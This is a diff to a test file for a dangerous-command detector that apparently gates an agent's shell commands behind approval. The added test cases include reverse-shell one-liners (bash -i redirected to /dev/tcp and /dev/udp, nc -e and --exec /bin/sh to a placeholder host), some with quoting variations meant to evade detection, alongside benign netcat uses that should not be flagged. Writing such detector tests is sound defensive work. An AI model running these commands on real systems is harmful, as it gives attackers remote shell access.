@@ -18,6 +18,10 @@ from tools.approval import detect_dangerous_command
     "socat TCP:host:4444 'SYSTEM:bash -li'",
     "nc h 1 -e /bin/sh",
     "cat x | nc -e /bin/sh host 1",
+    'bash -i >& "/dev/tcp/host/4444" 0>&1',
+    "bash -i >& '/dev/udp/host/53' 0>&1",
+    'nc "-e" /bin/sh host 4444',
+    "nc host 4444 '--exec' /bin/sh",
 ])
 def test_reverse_shell_requires_approval(command):
     assert detect_dangerous_command(command)[0] is True
@@ -32,6 +36,7 @@ def test_reverse_shell_requires_approval(command):
     "nc -zv h 80 || echo -e down",
     "socat TCP-LISTEN:80 TCP:h:80 & echo exec:started",
     "socat - tcp:host:80",
+    "nc -z host 80 # -e example",
 ])
 def test_reverse_shell_prose_and_plain_netcat_not_flagged(command):
     assert detect_dangerous_command(command)[0] is False
